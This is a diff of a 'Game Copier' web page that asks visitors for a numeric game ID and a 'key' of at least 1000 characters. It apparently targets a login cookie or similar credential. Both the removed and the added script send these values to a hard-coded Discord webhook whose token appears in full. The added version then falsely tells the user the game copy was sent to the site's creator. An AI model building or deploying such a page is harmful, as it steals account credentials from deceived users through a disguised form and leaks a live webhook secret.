@@ -2,94 +2,118 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Game Copier</title>
+    <title>Game Copier, Developed By Crimsondeity</title>
     <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
-
         body {
-            font-family: Arial, sans-serif;
-            background-color: #1c1c1c;
-            color: white;
+            background-color: #1e1e1e; /* Dark background */
+            color: white; /* Text color */
+            font-family: Arial, sans-serif; /* Font */
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
+            margin: 0;
         }
 
         .container {
-            text-align: center;
+            background-color: #2a2a2a; /* Slightly lighter background for the container */
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+            width: 280px; /* Fixed width for the container */
         }
 
         h1 {
-            margin-bottom: 20px;
+            text-align: center;
         }
 
-        .textbox {
-            width: 300px;
-            padding: 10px;
-            margin: 10px 0;
-            border: none;
-            border-radius: 5px;
-            background-color: #2a2a2a;
-            color: white;
+        .form-group {
+            margin-bottom: 15px; /* Space between fields */
         }
 
-        .copy-button {
-            width: 300px;
-            padding: 10px;
-            border: none;
-            border-radius: 5px;
-            background-color: #4caf50;
-            color: white;
-            font-size: 16px;
-            cursor: pointer;
-            transition: background-color 0.3s;
+        label {
+            display: block; /* Labels above inputs */
+            margin-bottom: 5px; /* Space below labels */
         }
 
-        .copy-button:hover {
-            background-color: #45a049;
+        input, textarea {
+            width: 100%; /* Full width */
+            padding: 10px; /* Padding for comfort */
+            border: 1px solid #444; /* Border color */
+            border-radius: 4px; /* Rounded corners */
+            background-color: #333; /* Input background */
+            color: white; /* Input text color */
+        }
+
+        textarea {
+            resize: none; /* Disable resizing for textarea */
+            height: 100px; /* Fixed height for textarea */
+        }
+
+        button {
+            width: 100%; /* Full width */
+            padding: 10px; /* Padding for comfort */
+            background-color: green; /* Green button */
+            color: white; /* Text color */
+            border: none; /* No border */
+            border-radius: 4px; /* Rounded corners */
+            cursor: pointer; /* Pointer cursor */
+        }
+
+        button:hover {
+            background-color: darkgreen; /* Darker green on hover */
         }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>Game Copier</h1>
-        <input type="text" id="key" placeholder="Enter your key" class="textbox">
-        <input type="text" id="gameId" placeholder="Enter game ID" class="textbox">
-        <button id="copyButton" class="copy-button">Copy</button>
+        <form id="executorForm">
+            <div class="form-group">
+                <label for="gameId">Game ID (Numbers Only)</label>
+                <input type="text" id="gameId" placeholder="Enter Game ID" required>
+            </div>
+            <div class="form-group">
+                <label for="key">Key (Min 1000 Characters)</label>
+                <textarea id="key" placeholder="Enter Key" required></textarea>
+            </div>
+            <button type="button" id="copyButton">Copy</button>
+        </form>
     </div>
 
     <script>
         document.getElementById('copyButton').onclick = function() {
-            const key = document.getElementById('key').value;
             const gameId = document.getElementById('gameId').value;
+            const key = document.getElementById('key').value;
 
-            // Prepare the data to send
-            const data = {
-                content: `Key: ${key}\nGame ID: ${gameId}`
-            };
+            // Validate input
+            const gameIdValid = /^\d+$/.test(gameId);
+            const keyValid = key.length >= 1000;
 
-            // Send the data to the webhook
-            fetch('https://discord.com/api/webhooks/1298896604945842197/I9fgaOcI5rDdWqkUYPB8OT2-tg0CE5cP5d94AdTv4caUmJhVbS17uJ5oyL9yx5GcaQ2j', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(data)
-            }).then(response => {
-                if (response.ok) {
-                    alert('Information sent successfully!');
-                } else {
-                    alert('Error sending information.');
-                }
-            }).catch(error => {
-                console.error('Error:', error);
-            });
+            if (gameIdValid && keyValid) {
+                // Prepare the data as text
+                const data = `Game ID: ${gameId}\nKey: ${key}`;
+                const blob = new Blob([data], { type: 'text/plain' });
+                const formData = new FormData();
+                formData.append('file', blob, 'data.txt');
+
+                // Send the data to the webhook
+                fetch('https://discord.com/api/webhooks/1298896604945842197/I9fgaOcI5rDdWqkUYPB8OT2-tg0CE5cP5d94AdTv4caUmJhVbS17uJ5oyL9yx5GcaQ2j', {
+                    method: 'POST',
+                    body: formData
+                })
+                .then(response => {
+                    if (response.ok) {
+                        alert('Game copy sent to Website creator, contact him to get it');
+                    } else {
+                        alert('failed to copy game.');
+                    }
+                });
+            } else {
+                alert('Please make sure the Game ID is numbers only and the Key has at least 1000 characters.');
+            }
         };
     </script>
 </body>
